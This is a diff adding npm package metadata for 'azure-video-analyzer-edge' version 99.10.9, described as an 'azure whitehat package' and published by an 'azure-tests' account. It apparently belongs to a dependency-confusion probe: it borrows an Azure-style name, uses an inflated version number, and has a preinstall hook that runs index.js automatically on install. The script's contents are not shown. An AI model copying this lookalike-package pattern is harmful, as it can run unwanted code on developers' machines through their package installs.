@@ -1,0 +1,39 @@
+{
+    "name": "azure-video-analyzer-edge",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-video-analyzer-edge@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-yfnMaOvLnH4TCZ4DaqWPSbkKsXK7GD2Q/+xaPABWo5fE4CzzU+DLsjHfD2fUeAnF/WT7Ko5uq9mddmLk52gJgQ==",
+        "shasum": "d41f0bf062ba53b04789c99f648a3bd9804e4438",
+        "tarball": "https://registry.npmjs.org/azure-video-analyzer-edge/-/azure-video-analyzer-edge-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3589,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoS0VCRA9TVsSAnZWagAAWYkQAJbsPl4pcvEG9OqQKf6V\nMTSPGNED52fHvELzob+h27OlSwlmqG+PvCVs8HPMzzOSQzDUiDEM8UmVkVJi\nf6fHUAeDZdMrDVofd9AeB0MExZ7MLmNiCdPZhOPMGnW2TzDbj1CCDgnQB7Jo\nMxATCP4cO3Qxd0wGnJ+R86A5SSkVV4yhmX9ENjJgdBllam46aefNKasceao+\nZIPIMdrEXred7e/XehE2t3/NUpO/Py3lgPHXt1+202Ypzf2LFIJwurnul/GE\nxLMXxVqyg3WQ9FSduELKLhRO6HPqXa7CzSc1HROS8dtKmQb+pjBF1XzRUyuw\nTbmhlO/KYfx2QrVLrWb2h0hKwaiNfiDPI/qd2G0an8qmbVxmiDqIFgCb+EB6\ncn2rSfxmxeKKYkW7J9LFJ6xQGYO78leBkZ9Ok9qR0Jr3pQbc7eyz1SOCavLA\n5FDRyhGFH7v1snVkQM0PB1Ppffic5Pj8imFH+RRCLoYkYbZ97aMiAvteHDio\n2Dt1HU8VJH/wTLy1xtDLJWw9rNDkB8beF0+/s7gpctMcuFs+Ah/x2ofj8EP2\nTYhdNX8BFn6ByIQom2lsM43LJPXGicl1eH9ZUG+x6q3vd/OaQ5JJa5uAMVUo\nk6YGNz4dF2153yaYqZJ1oB3aYBUngXHTRbpEflShMhBrecjMZN1uJuyl7CMB\nlRgZ\r\n=a/Er\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-video-analyzer-edge_99.10.9_1637952789251_0.7722832513410529"
+    },
+    "_hasShrinkwrap": false
+}
